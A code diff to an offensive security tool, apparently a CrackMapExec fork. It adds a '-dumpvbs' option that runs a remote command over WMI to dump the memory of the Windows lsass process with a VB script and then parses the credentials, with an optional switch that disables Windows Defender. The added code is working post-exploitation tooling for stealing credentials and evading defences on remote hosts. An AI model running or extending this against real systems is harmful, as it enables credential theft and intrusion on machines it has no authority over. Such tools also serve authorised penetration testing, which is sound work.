@@ -81,6 +81,9 @@ def requires_smb_server(func):
         if 'methods' in kwargs:
             methods = kwargs['methods']
 
+        if 'share' in kwargs:
+            smb_share_name = kwargs['share']
+
         if not payload and self.args.execute:
             if not self.args.no_output:
                 get_output = True
@@ -218,6 +221,7 @@ class smb(connection):
         execegroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='execute the specified PowerShell command')
 
         execegroup.add_argument("-dump", "--dump", action='store_true', help="Uses Procdumpx64 to dump lsass and retrieve the output.")
+        execegroup.add_argument("-dumpvbs", "--dumpvbs", action='store_true', help="Uses vb script to dump lsass and retrieve the output.")
 
         supergroup = smb_parser.add_argument_group("Multi-execution Commands")
         supergroup.add_argument("-netrecon", '--netrecon', action='store_true', help='Runs all network recon.')
@@ -405,6 +409,9 @@ class smb(connection):
 
         if not self.domain:
             self.domain = self.hostname
+
+        if self.args.share:
+            self.smb_share_name = self.args.share
 
         self.db.add_computer(self.host, self.hostname, self.domain, self.server_os)
 
@@ -1753,6 +1760,31 @@ class smb(connection):
         if dumpFile:
             self.parsedump(dumpFile)
 
+    @requires_admin
+    def dumpvbs(self):
+        """Procdump lsass the vbs way"""
+
+        if self.args.kd:
+            killDefender = True
+        else:
+            killDefender = False
+
+        try:
+            exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender, self.logger)
+            logging.debug('Dumping lsass using wmiexec')
+        except:
+            self.logger.error('Failed to initiate wmiexec')
+            logging.debug('Error launching shell via wmiexec, traceback:')
+            logging.debug(format_exc())
+            return
+
+        try:
+            dumpFile = exec_method.dumpvbs()
+        except Exception as e:
+            logging.debug('dump failed because: {}'.format(str(e)))
+
+        if dumpFile:
+            self.parsedump(dumpFile)
 
     def parsedump(self, dumpfile):
         # Inspiration by @HackAndDo aka Pixis for these parse bits
